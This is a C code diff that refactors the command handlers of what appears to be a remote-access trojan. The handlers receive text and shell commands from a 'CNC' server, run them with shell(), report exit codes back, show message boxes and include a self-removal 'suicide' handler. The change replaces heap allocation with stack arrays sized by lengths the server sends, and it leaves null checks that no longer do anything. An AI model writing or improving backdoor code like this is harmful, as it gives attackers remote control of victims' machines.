@@ -20,7 +20,8 @@ void handle_echo()
         log_error("Received invalid text length.");
         return;
     }
-    cmd.text = malloc(cmd.text_len + 1);
+    char cmd_text[cmd.text_len + 1];
+    cmd.text = cmd_text;
     if (!cmd.text)
     {
         log_error("Failed to allocate memory for the text.");
@@ -36,7 +37,6 @@ void handle_echo()
     log_info("Received echo: \"%s\"", cmd.text);
 
     ret = send_to_cnc(cmd.text, cmd.text_len);
-    free(cmd.text);
     if (ret != cmd.text_len)
     {
         log_error("Failed to send text to CNC.");
@@ -58,7 +58,8 @@ void handle_shell()
         log_error("Received invalid command length.");
         return;
     }
-    cmd.cmd = malloc(cmd.cmd_len + 1);
+    char cmd_cmd[cmd.cmd_len + 1];
+    cmd.cmd = cmd_cmd;
     if (!cmd.cmd)
     {
         log_error("Failed to allocate memory for the command.");
@@ -73,7 +74,6 @@ void handle_shell()
     cmd.cmd[cmd.cmd_len] = 0;
     log_info("Command: \"%s\"", cmd.cmd);
     shell(&cmd);
-    free(cmd.cmd);
     send_to_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
     while (TRUE)
     {
@@ -98,7 +98,8 @@ void handle_msgbox()
         log_error("Received invalid title length.");
         return;
     }
-    cmd.title = malloc(cmd.title_len + 1);
+    char cmd_title[cmd.title_len + 1];
+    cmd.title = cmd_title;
     if (!cmd.title)
     {
         log_error("Failed to allocate memory for the title.");
@@ -118,7 +119,8 @@ void handle_msgbox()
         log_error("Received invalid text length.");
         return;
     }
-    cmd.text = malloc(cmd.text_len + 1);
+    char cmd_text[cmd.text_len + 1];
+    cmd.text = cmd_text;
     if (!cmd.text)
     {
         log_error("Failed to allocate memory for the text.");
@@ -134,8 +136,6 @@ void handle_msgbox()
 
     log_info("Title: \"%s\", Text: \"%s\"", cmd.title, cmd.text);
     MessageBox(NULL, cmd.text, cmd.title, MB_OK);
-    free(cmd.title);
-    free(cmd.text);
 }
 
 void handle_suicide()
